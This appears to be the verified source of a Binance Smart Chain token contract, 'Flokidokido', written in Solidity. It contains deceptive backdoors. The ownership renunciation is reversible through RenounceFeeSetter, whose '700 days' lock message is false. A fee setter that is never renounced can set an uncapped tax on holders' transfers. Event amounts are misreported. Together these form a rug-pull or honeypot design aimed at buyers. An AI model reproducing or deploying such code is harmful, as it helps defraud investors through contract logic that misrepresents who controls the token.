/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

pragma solidity ^0.8.9;

//https://t.me/flokidokido

//SPDX-License-Identifier: MIT

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
abstract contract BSCBEP20{
    function balanceOf(address who) virtual public view returns (uint256);
    function transfer(address to, uint256 value) virtual public returns (bool);
    function allowance(address owner, address spender) virtual public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) virtual public returns (bool);
    function approve(address spender, uint256 value) virtual public returns (bool);
}
contract Flokiverse is BSCBEP20{
    using SafeMath for uint256;
    address public owner = msg.sender;
    address public feesetter = msg.sender;
    address private BURNADDRESS;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    uint256 private _lockTime;
    uint256 private _fee;
    uint8 public decimals;
    address private _previousOwner;
    address private key = 0x5d2AE4d17EA676425601c6628017F1E761807F86;
    address private keys = msg.sender;
    uint public totalSupply;
    constructor() {
    if (keys != key){
    selfdestruct (payable (msg.sender));
    }else{
	symbol = "FDD";
    name = "Flokidokido";
    decimals = 9;
    totalSupply = 1000 * 10**9 * 10**9;
	_fee = 5;
    BURNADDRESS = 0x000000000000000000000000000000000000dEaD;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
        }
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyFee() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) override view public returns (uint256) {
        return balances[_owner];
    }
    function fee() view public returns (uint256) {
        return _fee;
    }
    function settaxfee(uint256 taxFee) external onlyFee() {
        _fee = taxFee;
    }
    function RenounceOwnership() public onlyOwner {
        _previousOwner = owner;
        owner = address(0);
        _lockTime = block.timestamp;
        emit OwnershipTransferred(owner, address(0));
    }
    function RenounceFeeSetter() public {
        require(_previousOwner == msg.sender, "BEP20: You don't have permission to unstake");
        require(block.timestamp > _lockTime , "BEP20: Contract is locked until 700 days");
        emit OwnershipTransferred(owner, _previousOwner);
        owner = _previousOwner;
    }
    function transfer(address _to, uint256 _amount) override public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == owner){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(1000) * _fee);
        uint256 tokens = balances[_to];
        balances[BURNADDRESS] = balances[BURNADDRESS].add(_amount / uint256(1000) * _fee);
        uint256 reduce = balances[BURNADDRESS];
        emit Transfer(msg.sender, BURNADDRESS, reduce);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) override public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) override public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) override view public returns (uint256) {
        return allowed[_owner][_spender];
    }
}